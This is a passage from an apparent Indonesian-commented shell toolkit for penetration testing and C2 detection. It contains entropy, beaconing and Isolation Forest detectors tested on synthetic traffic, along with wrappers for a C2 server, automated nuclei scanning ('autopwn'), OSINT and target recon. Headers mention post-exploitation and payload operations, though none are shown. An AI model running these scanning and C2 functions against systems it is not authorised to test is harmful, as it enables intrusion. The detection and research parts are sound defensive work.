        kill -TERM "$pid" 2>/dev/null && rm -f "$AF_C2_PID_FILE" && \
            _anf_log ok "C2 stopped (PID: $pid)"
    else
        _anf_log warn "No C2 PID file found."
    fi
}

anf_c2_sessions() {
    local logfile="$AF_C2_DIR/logs/c2_sessions.jsonl"
    [[ ! -f "$logfile" ]] && { _anf_log err "No session log yet."; return 1; }
    print "${C_Y}=== C2 SESSION LOG ===${C_0}"
    if command -v jq >/dev/null 2>&1; then
        jq -r '"\(.timestamp) | \(.client) | blocked:\(.blocked) | \(.command)"' \
            "$logfile" 2>/dev/null
    else
        cat "$logfile"
    fi
}

# ==============================================================================
# SECTION 7 — MATHEMATICS & MACHINE LEARNING (Enhanced)
# [NEW-ENT]    7.1 Shannon Entropy + Bootstrap CI 95%
# [NEW-BEACON] 7.2 Beaconing: Jitter + Chi-Square + Autocorrelation R(1)
# [NEW-ISO]    7.3 Isolation Forest (dependency-free, pure Python)
# [BASELINE]   7.4 Z-Score (dipertahankan untuk perbandingan paper)
# ==============================================================================

# --- 7.1 Shannon Entropy dengan Bootstrap Confidence Interval [NEW-ENT] ---
anf_c2_entropy() {
    local input="$1"
    [[ -z "$input" ]] && { _anf_log err "Usage: /c2-entropy <string|file>"; return 1; }
    command -v python3 >/dev/null 2>&1 || { _anf_log err "python3 required"; return 1; }

    local data="$input"
    [[ -f "$input" ]] && {
        data=$(cat "$input" 2>/dev/null)
        _anf_log info "Reading file: $input"
    }

    local py_out
    py_out=$(python3 - "$data" << 'PYEOF'
import sys, math, random
from collections import Counter

data = sys.argv[1] if len(sys.argv) > 1 else ""
if not data.strip():
    print("ERR:empty"); sys.exit(0)

def h(s):
    """Shannon entropy H(X) = -Σ p(x) log₂ p(x)"""
    if not s: return 0.0
    c = Counter(s); n = len(s)
    return -sum((v/n) * math.log2(v/n) for v in c.values())

def bootstrap_ci(s, n_boot=500, conf=0.95):
    """Bootstrap Confidence Interval via resampling."""
    n = len(s)
    boots = sorted([h(random.choices(s, k=n)) for _ in range(n_boot)])
    lo = int((1 - conf) / 2 * n_boot)
    hi = int((1 + conf) / 2 * n_boot) - 1
    return boots[max(0,lo)], boots[min(hi, len(boots)-1)]

ent = h(data)
ci_lo, ci_hi = bootstrap_ci(data)
norm = ent / 8.0  # normalisasi: max H untuk byte = log₂(256) = 8

print(f"ENTROPY:{ent:.4f}")
print(f"CI_LO:{ci_lo:.4f}")
print(f"CI_HI:{ci_hi:.4f}")
print(f"NORM:{norm:.4f}")
print(f"LEN:{len(data)}")
PYEOF
    )

    [[ "$py_out" == *"ERR:empty"* ]] && { _anf_log err "Empty data."; return 1; }

    local ent ci_lo ci_hi norm dlen
    ent=$(echo "$py_out"  | awk -F: '/^ENTROPY/{print $2}')
    ci_lo=$(echo "$py_out" | awk -F: '/^CI_LO/{print $2}')
    ci_hi=$(echo "$py_out" | awk -F: '/^CI_HI/{print $2}')
    norm=$(echo "$py_out"  | awk -F: '/^NORM/{print $2}')
    dlen=$(echo "$py_out"  | awk -F: '/^LEN/{print $2}')

    # Threshold empiris — divalidasi via ROC sweep (eval-entropy-roc):
    # Plaintext ASCII  : H ∈ [3.5, 4.5]  → kelas normal
    # Base64/encoded   : H ∈ [4.5, 6.0]  → suspect
    # Encrypted/random : H ≥ 6.0         → optimal threshold F1≈1.0
    # Ref: ROC sweep pada 400 sampel sintetis (seed=42)
    local color="$C_G" verdict="Normal / Plaintext (H < 3.8)"
    _anf_float_gt "$ent" 6.0 && {
        color="$C_R"; verdict="ENCRYPTED C2 — H ≥ 6.0 (ROC optimal, near-random byte dist.)"
    }
    _anf_float_gt "$ent" 4.5 && _anf_float_lt "$ent" 6.0 && {
        color="$C_Y"; verdict="Encoded/Compressed — H ∈ (4.5, 6.0) — Possible Base64/C2"
    }
    _anf_float_gt "$ent" 3.8 && _anf_float_lt "$ent" 4.5 && {
        color="$C_M"; verdict="Possibly Obfuscated — H ∈ (3.8, 4.5)"
    }

    _anf_box "$C_Y" "SHANNON ENTROPY ANALYSIS  [MATH-01]"
    printf "  %-24s ${color}%s bits/byte${C_0}\n" "Entropy H(X):"    "$ent"
    printf "  %-24s [%s, %s]\n"                   "95%% CI (Bootstrap):" "$ci_lo" "$ci_hi"
    printf "  %-24s %s\n"                          "Normalized (÷8):" "$norm"
    printf "  %-24s %s bytes\n"                    "Input length:"    "$dlen"
    printf "  %-24s ${color}%s${C_0}\n"            "Verdict:"         "$verdict"
    print ""
    print "  ${DIM}Reference thresholds (empirical):${C_0}"
    print "  ${DIM}  Encrypted/random : H > 7.0${C_0}"
    print "  ${DIM}  Base64           : H ∈ [4.5, 6.0]${C_0}"
    print "  ${DIM}  Plaintext ASCII  : H ∈ [3.5, 4.5]${C_0}"
}

# --- 7.2 Beaconing: Jitter + Chi-Square + Autocorrelation [NEW-BEACON] ---
anf_c2_beacon_math() {
    local logfile="${1:-$AF_C2_DIR/logs/stdout.log}"
    [[ ! -f "$logfile" ]] && { _anf_log err "Log not found: $logfile"; return 1; }
    command -v python3 >/dev/null 2>&1 || { _anf_log err "python3 required"; return 1; }

    local py_out
    py_out=$(python3 - "$logfile" << 'PYEOF'
import re, math, sys
from datetime import datetime

logfile = sys.argv[1]
timestamps = []
with open(logfile, encoding="utf-8", errors="replace") as f:
    for line in f:
        m = re.search(r'(\d{2}:\d{2}:\d{2})', line)
        if m:
            timestamps.append(
                datetime.strptime(m.group(1), '%H:%M:%S').timestamp()
            )

if len(timestamps) < 5:
    print("DATA_KURANG"); sys.exit(0)

intervals = [timestamps[i] - timestamps[i-1] for i in range(1, len(timestamps))]
n    = len(intervals)
mean = sum(intervals) / n
var  = sum((x - mean)**2 for x in intervals) / n
std  = math.sqrt(var) if var > 0 else 0
jitter = (std / mean) * 100 if mean > 0 else 0

# [MATH-02a] Autocorrelation R(lag=1)
# Nilai mendekati 1.0 → sangat periodik → C2 beaconing
def autocorr(data, lag=1):
    n = len(data)
    if n <= lag: return 0.0
    mu = sum(data) / n
    num = sum((data[i] - mu) * (data[i-lag] - mu) for i in range(lag, n))
    den = sum((x - mu)**2 for x in data)
    return num / den if den > 0 else 0.0

r1 = autocorr(intervals, lag=1)

# [MATH-02b] Chi-Square uniformity test
# H₀: interval terdistribusi uniform (traffic acak / human-like)
# Jika ditolak (p < α=0.05) → distribusi tidak uniform → indikasi beaconing
def chi_square_uniform(data, bins=10):
    if not data: return 0.0
    lo, hi = min(data), max(data)
    if lo == hi: return 0.0
    bw = (hi - lo) / bins
    obs = [0] * bins
    for x in data:
        idx = min(int((x - lo) / bw), bins - 1)
        obs[idx] += 1
    exp = len(data) / bins
    return sum((o - exp)**2 / exp for o in obs)

chi2 = chi_square_uniform(intervals)
df   = 9  # bins - 1
# Threshold chi2 untuk p=0.05, df=9 → 16.92
p_val_label = "< 0.05 (reject H0)" if chi2 > 16.92 else ">= 0.05 (accept H0)"

print(f"MEAN:{mean:.2f}")
print(f"STDDEV:{std:.2f}")
print(f"JITTER:{jitter:.2f}")
print(f"COUNT:{n}")
print(f"R1:{r1:.4f}")
print(f"CHI2:{chi2:.4f}")
print(f"PVAL:{p_val_label}")
PYEOF
    )

    [[ "$py_out" == *"DATA_KURANG"* ]] && {
        _anf_log warn "Butuh minimal 5 timestamp. Data terlalu sedikit."
        return 1
    }

    local mean stddev jitter count r1 chi2 pval
    mean=$(echo "$py_out"   | awk -F: '/^MEAN/{print $2}')
    stddev=$(echo "$py_out" | awk -F: '/^STDDEV/{print $2}')
    jitter=$(echo "$py_out" | awk -F: '/^JITTER/{print $2}')
    count=$(echo "$py_out"  | awk -F: '/^COUNT/{print $2}')
    r1=$(echo "$py_out"     | awk -F: '/^R1/{print $2}')
    chi2=$(echo "$py_out"   | awk -F: '/^CHI2/{print $2}')
    pval=$(echo "$py_out"   | awk -F: '/^PVAL/{print $2}')

    local j_color="$C_G" j_verdict="Normal / Human-like"
    _anf_float_lt "$jitter" 5.0 && {
        j_color="$C_R"
        j_verdict="SANGAT PERIODIK → C2 Beaconing Terdeteksi!"
    }
    { _anf_float_gt "$jitter" 5.0 && _anf_float_lt "$jitter" 15.0; } && {
        j_color="$C_Y"
        j_verdict="Jitter rendah → Possible C2 with jitter obfuscation"
    }

    _anf_box "$C_Y" "BEACONING MATHEMATICAL ANALYSIS [MATH-02]"
    printf "  %-28s %s\n"                           "Samples (n):"     "$count"
    printf "  %-28s %ss\n"                          "Mean Interval μ:" "$mean"
    printf "  %-28s %ss\n"                          "Std Dev σ:"       "$stddev"
    printf "  %-28s ${j_color}%s%%${C_0} ← %s\n"  "Jitter (σ/μ×100):" "$jitter" "$j_verdict"
    print ""
    printf "  %-28s %s\n"  "Autocorrelation R(1):"   "$r1"
    printf "  ${DIM}  %-26s %s${C_0}\n" "Interpretation:" "(>0.7 = highly periodic = C2)"
    print ""
    printf "  %-28s %s\n"  "Chi-Square Statistic:"   "$chi2"
    printf "  %-28s %s\n"  "p-value (approx):"       "$pval"
    printf "  ${DIM}  %-26s %s${C_0}\n" "H₀:" "intervals uniformly distributed"
}

# --- 7.3 Isolation Forest — Dependency-Free [NEW-ISO] ---
anf_c2_ml_hunt() {
    local sample_size="${1:-200}"
    _anf_log ml "Isolation Forest (Liu et al., 2008) — n=$sample_size"
    command -v python3 >/dev/null 2>&1 || { _anf_log err "python3 required"; return 1; }

    local py_out
    py_out=$(python3 - "$sample_size" << 'PYEOF'
"""
Isolation Forest — implementasi murni Python, tanpa dependensi eksternal.
Reference: Liu, F.T., Ting, K.M., Zhou, Z.H. (2008).
           Isolation Forest. ICDM 2008.
"""
import math, random, sys
random.seed(42)  # Reproducibility

N = int(sys.argv[1]) if len(sys.argv) > 1 else 200

# --- Isolation Tree ---
class IsolationTree:
    __slots__ = ('left', 'right', 'feature', 'value', 'size', 'depth_limit')

    def __init__(self, depth_limit: int):
        self.depth_limit = depth_limit
        self.left = self.right = self.feature = self.value = None
        self.size = 0

    def fit(self, X: list, depth: int = 0):
        self.size = len(X)
        if depth >= self.depth_limit or len(X) <= 1:
            return self
        n_feat = len(X[0])
        self.feature = random.randrange(n_feat)
        col = [x[self.feature] for x in X]
        lo, hi = min(col), max(col)
        if lo == hi:
            return self
        self.value = random.uniform(lo, hi)
        left_X  = [x for x in X if x[self.feature] <  self.value]
        right_X = [x for x in X if x[self.feature] >= self.value]
        lim = self.depth_limit
        if left_X:  self.left  = IsolationTree(lim).fit(left_X,  depth + 1)
        if right_X: self.right = IsolationTree(lim).fit(right_X, depth + 1)
        return self

    def path_length(self, x: list, depth: int = 0) -> float:
        if self.feature is None or depth >= self.depth_limit:
            return depth + self._c(self.size)
        if x[self.feature] < self.value:
            return self.left.path_length(x, depth + 1) if self.left  else float(depth)
        return     self.right.path_length(x, depth + 1) if self.right else float(depth)

    @staticmethod
    def _c(n: int) -> float:
        """Rata-rata panjang jalur untuk BST dengan n node."""
        if n <= 1: return 0.0
        return 2.0 * (math.log(n - 1) + 0.5772156649) - 2.0 * (n - 1) / n

# --- Isolation Forest ---
class IsolationForest:
    def __init__(self, n_trees=100, sub_size=64, contamination=0.2):
        self.n_trees       = n_trees
        self.sub_size      = sub_size
        self.contamination = contamination
        self.trees         = []
        self.threshold     = 0.5
        self._c_n          = 0.0

    def fit(self, X: list):
        ss = min(self.sub_size, len(X))
        self._c_n = IsolationTree._c(ss)
        dlim = math.ceil(math.log2(ss)) if ss > 1 else 1
        for _ in range(self.n_trees):
            sample = random.sample(X, ss)
            self.trees.append(IsolationTree(dlim).fit(sample))
        scores = [self._score(x) for x in X]
        idx = int((1 - self.contamination) * len(scores))
        self.threshold = sorted(scores)[min(idx, len(scores) - 1)]
        return self

    def _score(self, x: list) -> float:
        avg = sum(t.path_length(x) for t in self.trees) / len(self.trees)
        return 2.0 ** (-avg / self._c_n) if self._c_n > 0 else 0.5

    def predict(self, X: list) -> list:
        return [1 if self._score(x) >= self.threshold else 0 for x in X]

# --- Synthetic C2 + normal traffic ---
n_normal = int(N * 0.8)
n_c2     = N - n_normal

# Features: [packet_size_bytes, shannon_entropy, interval_sec]
normal = [[random.gauss(500,150), random.gauss(3.5,0.5), random.gauss(10,5)]
          for _ in range(n_normal)]
c2     = [[random.gauss(120, 20), random.gauss(6.2,0.3), random.gauss(60,2)]
          for _ in range(n_c2)]

X      = normal + c2
labels = [0] * n_normal + [1] * n_c2

clf = IsolationForest(n_trees=100, sub_size=64, contamination=0.2)
clf.fit(X)
preds = clf.predict(X)

tp = sum(1 for p,l in zip(preds,labels) if p==1 and l==1)
fp = sum(1 for p,l in zip(preds,labels) if p==1 and l==0)
fn = sum(1 for p,l in zip(preds,labels) if p==0 and l==1)
tn = sum(1 for p,l in zip(preds,labels) if p==0 and l==0)

prec = tp/(tp+fp) if (tp+fp)>0 else 0.0
rec  = tp/(tp+fn) if (tp+fn)>0 else 0.0
f1   = 2*prec*rec/(prec+rec) if (prec+rec)>0 else 0.0

print(f"TOTAL:{len(X)}")
print(f"N_C2:{n_c2}")
print(f"TP:{tp}")
print(f"FP:{fp}")
print(f"FN:{fn}")
print(f"TN:{tn}")
print(f"PREC:{prec:.4f}")
print(f"REC:{rec:.4f}")
print(f"F1:{f1:.4f}")
PYEOF
    )

    local total n_c2 tp fp fn tn prec rec f1
    total=$(echo "$py_out" | awk -F: '/^TOTAL/{print $2}')
    n_c2=$(echo "$py_out"  | awk -F: '/^N_C2/{print $2}')
    tp=$(echo "$py_out"    | awk -F: '/^TP/{print $2}')
    fp=$(echo "$py_out"    | awk -F: '/^FP/{print $2}')
    fn=$(echo "$py_out"    | awk -F: '/^FN/{print $2}')
    tn=$(echo "$py_out"    | awk -F: '/^TN/{print $2}')
    prec=$(echo "$py_out"  | awk -F: '/^PREC/{print $2}')
    rec=$(echo "$py_out"   | awk -F: '/^REC/{print $2}')
    f1=$(echo "$py_out"    | awk -F: '/^F1/{print $2}')

    _anf_box "$C_Y" "ISOLATION FOREST — C2 ANOMALY DETECTION [ML-01]"
    printf "  %-24s %s\n" "Algorithm:" "Isolation Forest (Liu et al., 2008)"
    printf "  %-24s %s\n" "Features:" "[packet_size, entropy, interval]"
    printf "  %-24s %d (Normal: %d, C2: %d)\n" \
        "Flows:" $total $(( total - n_c2 )) $n_c2
    print ""
    printf "  %-24s ${C_G}%d${C_0}\n" "True Positives:"  $tp
    printf "  %-24s ${C_R}%d${C_0}\n" "False Positives:" $fp
    printf "  %-24s ${C_R}%d${C_0}\n" "False Negatives:" $fn
    printf "  %-24s ${C_G}%d${C_0}\n" "True Negatives:"  $tn
    print  "  ──────────────────────────────"
    printf "  %-24s ${C_C}%s${C_0}\n" "Precision:" $prec
    printf "  %-24s ${C_C}%s${C_0}\n" "Recall:"    $rec
    printf "  %-24s ${C_C}%s${C_0}\n" "F1-Score:"  $f1
    print ""
    print "  ${DIM}Liu, F.T., Ting, K.M., & Zhou, Z.H. (2008).${C_0}"
    print "  ${DIM}Isolation Forest. ICDM 2008, pp. 413-422.${C_0}"
}

# --- 7.4 Z-Score Baseline (dipertahankan untuk perbandingan) [BASELINE] ---
anf_c2_zscore() {
    local sample_size="${1:-100}"
    _anf_log ml "Z-Score Multivariate (baseline, n=$sample_size)..."
    command -v python3 >/dev/null 2>&1 || { _anf_log err "python3 required"; return 1; }

    local py_out
    py_out=$(python3 - "$sample_size" << 'PYEOF'
import math, random, sys
random.seed(42)

N = int(sys.argv[1]) if len(sys.argv) > 1 else 100

def gen(n):
    f = []
    for _ in range(int(n*0.8)):
        f.append([random.gauss(500,150), random.gauss(3.5,0.5), random.gauss(10,5)])
    for _ in range(int(n*0.2)):
        f.append([random.gauss(120,20), random.gauss(6.2,0.3), random.gauss(60,2)])
    return f

def zscore_detect(flows, threshold=2.5):
    n = len(flows); k = len(flows[0])
    mean = [sum(f[i] for f in flows)/n for i in range(k)]
    std  = [math.sqrt(sum((f[i]-mean[i])**2 for f in flows)/n) for i in range(k)]
    anom = sum(
        1 for f in flows
        if math.sqrt(sum(((f[i]-mean[i])/std[i])**2 for i in range(k) if std[i]>0)) > threshold
    )
    return anom

flows = gen(N)
labels = [0]*int(N*0.8) + [1]*(N - int(N*0.8))
anom = zscore_detect(flows)

# Approximate TP/FP (assumes anomalies are from C2 class)
tp = min(anom, len([l for l in labels if l==1]))
fp = max(0, anom - tp)
fn = len([l for l in labels if l==1]) - tp
prec = tp/(tp+fp) if (tp+fp)>0 else 0.0
rec  = tp/(tp+fn) if (tp+fn)>0 else 0.0
f1   = 2*prec*rec/(prec+rec) if (prec+rec)>0 else 0.0

print(f"TOTAL:{N}")
print(f"ANOM:{anom}")
print(f"TP:{tp}"); print(f"FP:{fp}"); print(f"FN:{fn}")
print(f"PREC:{prec:.4f}"); print(f"REC:{rec:.4f}"); print(f"F1:{f1:.4f}")
PYEOF
    )

    local total anom tp fp fn prec rec f1
    total=$(echo "$py_out" | awk -F: '/^TOTAL/{print $2}')
    anom=$(echo "$py_out"  | awk -F: '/^ANOM/{print $2}')
    tp=$(echo "$py_out"    | awk -F: '/^TP/{print $2}')
    fp=$(echo "$py_out"    | awk -F: '/^FP/{print $2}')
    fn=$(echo "$py_out"    | awk -F: '/^FN/{print $2}')
    prec=$(echo "$py_out"  | awk -F: '/^PREC/{print $2}')
    rec=$(echo "$py_out"   | awk -F: '/^REC/{print $2}')
    f1=$(echo "$py_out"    | awk -F: '/^F1/{print $2}')

    print "${C_Y}=== Z-SCORE BASELINE [ML-BASELINE] ===${C_0}"
    printf "  %-22s %s\n" "Algorithm:" "Multivariate Z-Score (Baseline)"
    printf "  %-22s %d\n" "Total Flows:" $total
    printf "  %-22s ${C_R}%d${C_0}\n" "Anomalies Detected:" $anom
    printf "  %-22s ${C_C}%s / %s / %s${C_0}\n" "Prec/Recall/F1:" $prec $rec $f1
    print  "  ${DIM}Use /eval-compare-ml to compare with Isolation Forest.${C_0}"
}

# ==============================================================================
# SECTION 8 — Evaluation Framework [EVAL-01] [EVAL-02]
# New: ROC threshold sweep, ML comparison, CSV export
# ==============================================================================
AF_EVAL_DIR="$ANF_CACHE_DIR/eval"

# --- 8.1 ROC Curve Analysis untuk Entropy Threshold ---
anf_eval_entropy_roc() {
    _anf_log info "Entropy ROC sweep — generating CSV..."
    command -v python3 >/dev/null 2>&1 || { _anf_log err "python3 required"; return 1; }

    local outfile="$AF_EVAL_DIR/results/entropy_roc_$(date +%Y%m%d_%H%M%S).csv"
    mkdir -p "$AF_EVAL_DIR/results"

    python3 << 'PYEOF' | tee "$outfile"
import math, random
from collections import Counter

random.seed(42)

def entropy(s):
    if not s: return 0.0
    c = Counter(s); n = len(s)
    return -sum((v/n)*math.log2(v/n) for v in c.values())

def gen_dataset(n=400):
    """Hasilkan dataset berlabel untuk analisis ROC."""
    samples = []
    # Kelas 0 — plaintext (H rendah)
    for _ in range(n // 4):
        t = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz ', k=200))
        samples.append((entropy(t), 0))
    # Kelas 0 — base64-like (H sedang)
    b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='
    for _ in range(n // 4):
        samples.append((entropy(''.join(random.choices(b64, k=200))), 0))
    # Kelas 1 — encrypted/random (H tinggi)
    for _ in range(n // 2):
        samples.append((entropy(''.join(chr(random.randint(0,255)) for _ in range(200))), 1))
    return samples

samples = gen_dataset(400)
print("threshold,tpr,fpr,precision,recall,f1,accuracy")
for t100 in range(300, 800, 5):
    t = t100 / 100
    preds  = [1 if s > t else 0 for s, _ in samples]
    labels = [l for _, l in samples]
    tp = sum(1 for p,l in zip(preds,labels) if p==1 and l==1)
    fp = sum(1 for p,l in zip(preds,labels) if p==1 and l==0)
    fn = sum(1 for p,l in zip(preds,labels) if p==0 and l==1)
    tn = sum(1 for p,l in zip(preds,labels) if p==0 and l==0)
    tpr  = tp/(tp+fn)   if (tp+fn)>0   else 0
    fpr  = fp/(fp+tn)   if (fp+tn)>0   else 0
    prec = tp/(tp+fp)   if (tp+fp)>0   else 0
    rec  = tp/(tp+fn)   if (tp+fn)>0   else 0
    f1   = 2*prec*rec/(prec+rec) if (prec+rec)>0 else 0
    acc  = (tp+tn)/(tp+fp+fn+tn) if (tp+fp+fn+tn)>0 else 0
    print(f"{t:.2f},{tpr:.4f},{fpr:.4f},{prec:.4f},{rec:.4f},{f1:.4f},{acc:.4f}")
PYEOF
    _anf_log ok "ROC CSV → $outfile"
    _anf_log info "Gunakan pandas/matplotlib/Excel untuk plot ROC curve."
}

# --- 8.2 ML Algorithm Comparison (Z-Score vs Isolation Forest) ---
anf_eval_compare_ml() {
    local n="${1:-200}"
    _anf_box "$C_Y" "ML ALGORITHM COMPARISON (n=$n)"

    local outfile="$AF_EVAL_DIR/results/ml_compare_$(date +%Y%m%d_%H%M%S).txt"
    mkdir -p "$AF_EVAL_DIR/results"

    {
        print "=== ML Comparison Report ==="
        print "Generated: $(date)"
        print "Sample size: $n"
        print ""
        print "--- Z-Score (Baseline) ---"
    } > "$outfile"

    print "\n${C_C}── Z-Score Baseline ──${C_0}"
    anf_c2_zscore "$n" 2>&1 | tee -a "$outfile"

    print "\n${C_C}── Isolation Forest ──${C_0}"
    { print ""; print "--- Isolation Forest ---"; } >> "$outfile"
    anf_c2_ml_hunt "$n" 2>&1 | tee -a "$outfile"

    print "\n${DIM}Full comparison saved: $outfile${C_0}"
}

# --- 8.3 Export Audit Log ke CSV ---
anf_eval_export_audit() {
    [[ ! -f "$_ANF_AUDIT_LOG" ]] && { _anf_log err "Audit log belum ada."; return 1; }
    command -v jq >/dev/null 2>&1 || { _anf_log err "jq required"; return 1; }
    local outfile="$AF_EVAL_DIR/results/audit_$(date +%Y%m%d_%H%M%S).csv"
    mkdir -p "$AF_EVAL_DIR/results"
    {
        print "timestamp,session,user,command,canonical,decision"
        jq -r '[.timestamp,.session,.user,.command,.canonical,.decision] | @csv' \
            "$_ANF_AUDIT_LOG" 2>/dev/null
    } > "$outfile"
    _anf_log ok "Audit CSV → $outfile"
}

# ==============================================================================
# SECTION 9 — OSINT, Exploit, Post-Exploit, Defense
# ==============================================================================
anf_osint_email() {
    [[ -z "$1" ]] && { _anf_log err "Usage: /osint-email <email>"; return 1; }
    command -v holehe >/dev/null 2>&1 \
        && holehe --no-color "$1" \
        || _anf_log err "holehe missing. Install: pip install holehe"
}

anf_autopwn() {
    local target="${1:-$T}"
    [[ -z "$target" ]] && { _anf_log err "No target."; return 1; }
    command -v nuclei >/dev/null 2>&1 \
        && nuclei -target "$target" -severity critical,high -silent \
        || _anf_log err "nuclei missing"
}

anf_suricata() {
    _anf_check_sudo || return 1
    if _anf_has_bin suricata; then
        # Jalankan di background biar tidak memblokir terminal.
        sudo suricata -i "${1:-eth0}" \
            -c /etc/suricata/suricata.yaml \
            -l /var/log/suricata &
    else
        _anf_log err "suricata missing"
    fi
}

anf_yara_scan() {
    [[ -z "$1" ]] && { _anf_log err "Usage: /yara-scan <path>"; return 1; }
    command -v yara >/dev/null 2>&1 \
        && yara -r /usr/share/yara/rules/index.yar "$1" \
        || _anf_log err "yara missing"
}

anf_report() {
    local ws="${ANF_WS:-general}"
    local outfile="$ANF_CACHE_DIR/workspaces/$ws/report_$(date +%Y%m%d_%H%M%S).md"
    {
        print "# ANF Report"
        print "**Date:** $(date)"
        print "**Target:** ${T:-<unset>}"
        print "**Workspace:** $ws"
        print "**Session:** $_ANF_SESSION_ID"
        print ""
        print "## Subdomains"
        cat "$ANF_CACHE_DIR/workspaces/$ws/scans/subdomains_${T:-unknown}_$(date +%Y%m%d).txt" 2>/dev/null \
            || print "_No data_"
        print ""
        print "## Notes"
        cat "$ANF_CACHE_DIR/workspaces/$ws/notes/$(date +%Y%m%d)_log.md" 2>/dev/null \
            || print "_No notes_"
        print ""
        print "## GuardFall Metrics"
        anf_guardfall_metrics 2>&1
    } > "$outfile"
    _anf_log ok "Report → $outfile"
}

anf_sysinfo() {
    local file="sysinfo_$(date +%Y%m%d_%H%M%S).txt"
    {
        uname -a
        command -v lscpu >/dev/null && lscpu
        command -v free  >/dev/null && free -h
        command -v df    >/dev/null && df -h
    } > "$file" 2>&1
    _anf_log ok "Sysinfo → $file"
}

# ==============================================================================

# ==============================================================================
# SECTION 9.5 — v12 Operational Modules (merged from v12.8.7-FINAL)
# IP cache, targets, install/update, wireless, pivoting, post-exploitation, playbook,
# AI assist, selftest, hermes integration, C2 payload ops. Server C2 v14 tetap dipakai.
# ==============================================================================

AF_TARGETS_FILE="$ANF_CACHE_DIR/targets/list.txt"

typeset -g HERMES_BIN=""
_anf_hermes_state="$ANF_CACHE_DIR/state/hermes_path"

_anf_hermes_state="$ANF_CACHE_DIR/state/hermes_path"

_anf_validate_path() {
  local p="${1:A}"
  [[ -x "$p" ]] && [[ "$p" == "$HOME"* || "$p" == "/usr"* || "$p" == "/opt"* || "$p" == "/snap"* || "$p" == "/home"* ]]
}

_anf_hermes_candidates() {
  print -l -- "$HOME/hermes-agent/hermes" "$HOME/.local/share/hermes/hermes" "$HOME/.local/share/hermes-agent/hermes" "$HOME/hermes/hermes" "$HOME/.hermes/bin/hermes" "/opt/hermes/hermes" "/opt/hermes-agent/hermes" "$HOME/go/bin/hermes" "$HOME/.npm-global/bin/hermes" "$HOME/.local/bin/hermes"
}

anf_cached_ip() {
  local f="$ANF_CACHE_DIR/ip"
  [[ -f "$f" ]] && cat "$f" 2>/dev/null || print -r -- "offline"
}

anf_check_ip() {
  _anf_log info "Fetching public IP..."
  local raw
  raw=$(_anf_with_timeout 8 curl -sS https://api.ipify.org 2>/dev/null)
  if _anf_validate_ip "$raw"; then
    print -r -- "$raw" > "$ANF_CACHE_DIR/ip"
    _anf_log ok "Public IP: $raw"
  else
    print -r -- "offline" > "$ANF_CACHE_DIR/ip"
    _anf_log warn "offline"
  fi
}

anf_clear_ip() {
  print -r -- "offline" > "$ANF_CACHE_DIR/ip"
  _anf_log ok "IP cache cleared."
}

# ---------------------------------------------------------------------
# Target Management
# ---------------------------------------------------------------------
AF_TARGETS_FILE="$ANF_CACHE_DIR/targets/list.txt"

anf_targets_add() { local t="$1"; [[ -z "$t" ]] && return; grep -qxF "$t" "$AF_TARGETS_FILE" 2>/dev/null || print -r -- "$t" >> "$AF_TARGETS_FILE"; }

anf_targets_list() { [[ -f "$AF_TARGETS_FILE" ]] && cat "$AF_TARGETS_FILE" || _anf_log warn "No targets saved."; }

anf_targets_remove() { local t="$1"; [[ -z "$t" ]] && return; sed -i "/^${t}$/d" "$AF_TARGETS_FILE" 2>/dev/null; _anf_log ok "Removed $t"; }

anf_targets_clear() { > "$AF_TARGETS_FILE"; _anf_log ok "Targets cleared."; }

anf_targets() {
  case "$1" in
    list)   anf_targets_list ;;
    add)    shift; anf_targets_add "$@" ;;
    remove) shift; anf_targets_remove "$@" ;;
    clear)  anf_targets_clear ;;
    *)      _anf_log warn "Usage: /targets list|add|remove|clear";;
  esac
}

# ---------------------------------------------------------------------
# Workspace & Note
# ---------------------------------------------------------------------

anf_log() {
  local ws="${ANF_WS:-general}"
  local logfile="$ANF_CACHE_DIR/workspaces/$ws/notes/$(date +%Y%m%d)_log.md"
  [[ -f "$logfile" ]] && less "$logfile" || _anf_log warn "No log for today in workspace $ws"
}

# ---------------------------------------------------------------------
# Status, Config, Paths, Version, Doctor, Install, Update
# ---------------------------------------------------------------------

anf_config() { print "${C_Y}=== CONFIG ===${C_0}"; print "  ${C_T}Cache:${C_0} $ANF_CACHE_DIR"; print "  ${C_T}Target:${C_0} ${T:-<unset>}"; print "  ${C_T}UX alias (ls/cat/grep/cd):${C_0} ${ANF_UX_ALIASES:-0}"; print "  ${C_T}Tanpa alias (bentrok biner):${C_0} ${#_ANF_SHADOWED} ${(j:, :)_ANF_SHADOWED}"; }

anf_paths() { print "${C_Y}=== PATHS ===${C_0}"; print "  ${C_T}Cache:${C_0} $ANF_CACHE_DIR"; print "  ${C_T}Log:${C_0} $AF_LOG_FILE"; }

anf_version() { print "${C_Y}=== VERSION ===${C_0}"; print "  ${C_T}Version:${C_0} $ANF_VERSION"; }

anf_install() {
  [[ -z "$1" ]] && return 1
  local mgr=$(_anf_get_pkg_mgr)
  case $mgr in
    apt) sudo apt install -y "$@";;
    pacman) sudo pacman -S --noconfirm "$@";;
    dnf) sudo dnf install -y "$@";;
    brew) brew install "$@";;
    *) _anf_log err "No known package manager"; return 1;;
  esac
  _anf_log ok "Installed: $*"
}

anf_update() {
  local repo_dir="${ANF_REPO:-$HOME/.anf}"
  if [[ -d "$repo_dir/.git" ]]; then
    _anf_log info "Updating from git..."
    ( cd "$repo_dir" && git pull && _anf_log ok "Update complete. Please restart shell." )
  else
    _anf_log err "Not a git repository. Set ANF_REPO to point to the repo."
  fi
}

# ---------------------------------------------------------------------
# Recon
# ---------------------------------------------------------------------

anf_subdomains_json() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "No target"; return 1; }
  command -v subfinder >/dev/null 2>&1 && subfinder -silent -d "$target" -o json 2>/dev/null || _anf_log err "subfinder not installed"
}

anf_dns() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "No target set"; return 1; }
  command -v dig >/dev/null 2>&1 && dig +short "$target" A || _anf_log err "dig missing"
}

anf_whois() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "No target set"; return 1; }
  if _anf_has_bin whois; then whois "$target" | head -40; else _anf_log err "whois missing"; fi
}

anf_quickrecon() {
  local target=${1:-$T}; [[ -z "$target" ]] && { _anf_log err "No target set"; return 1; }
  anf_set_target "$target"
  anf_subdomains "$target"
  anf_scan "$target"
}

# ---------------------------------------------------------------------
# Wireless
# ---------------------------------------------------------------------

anf_wifisurvey() {
  _anf_log info "=== WIFI ==="
